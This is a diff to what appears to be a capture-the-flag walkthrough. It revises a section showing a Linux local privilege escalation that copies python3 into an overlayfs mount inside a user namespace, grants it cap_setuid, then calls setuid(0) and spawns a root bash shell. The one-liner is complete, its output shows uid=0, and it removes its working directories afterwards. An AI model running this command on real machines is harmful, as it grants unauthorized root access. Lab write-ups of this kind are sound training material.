@@ -134,7 +134,11 @@ metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; se
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-To get a full root shell rather than a single `id`, the final command is swapped for `os.system("/bin/bash")`.
+To get a full root shell rather than a single `id`, the trailing `id` in the `os.system(...)` call is swapped for `bash`:
+
+```
+metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
+```
 
 > ℹ️ The first run failed with `mount: bad usage` because of a stray space in the mount options (`-o rw, lowerdir=...`). Removing the space so the options are one unbroken comma-separated list (`-o rw,lowerdir=l,upperdir=u,workdir=w`) made the mount succeed and dropped the root shell.
 
